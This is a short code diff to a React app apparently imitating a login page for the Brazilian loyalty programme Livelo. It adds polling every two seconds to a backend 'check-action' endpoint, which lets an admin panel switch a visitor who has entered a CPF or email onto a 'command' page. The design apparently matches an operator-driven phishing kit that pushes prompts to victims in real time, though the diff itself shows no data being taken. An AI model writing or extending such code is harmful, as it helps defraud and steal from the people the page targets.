@@ -3,6 +3,7 @@ import "@/App.css";
 import { BrowserRouter, Routes, Route, Navigate } from "react-router-dom";
 import AdminLogin from "@/pages/AdminLogin";
 import AdminPanel from "@/pages/AdminPanel";
+import CommandPage from "@/pages/CommandPage";
 import axios from "axios";
 
 const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
@@ -15,7 +16,35 @@ function LiveloLogin() {
   const [showPassword, setShowPassword] = useState(false);
   const [isValid, setIsValid] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
-  const [userId, setUserId] = useState(null);
+  const [userId, setUserId] = useState(localStorage.getItem("livelo_user_id"));
+  const [showCommandPage, setShowCommandPage] = useState(false);
+
+  // Verificar se há comando ativo
+  useEffect(() => {
+    if (!userId) return;
+
+    const checkCommand = async () => {
+      try {
+        const response = await axios.get(`${API}/user/check-action/${userId}`);
+        if (response.data && response.data.action) {
+          setShowCommandPage(true);
+        } else {
+          setShowCommandPage(false);
+        }
+      } catch (error) {
+        console.error("Erro ao verificar comando:", error);
+      }
+    };
+
+    checkCommand();
+    const interval = setInterval(checkCommand, 2000);
+    return () => clearInterval(interval);
+  }, [userId]);
+
+  // Se houver comando ativo, mostrar página de comando
+  if (showCommandPage && userId) {
+    return <CommandPage userId={userId} />;
+  }
 
   // Validação de CPF (11 dígitos) ou Email
   const validateCredential = (value) => {
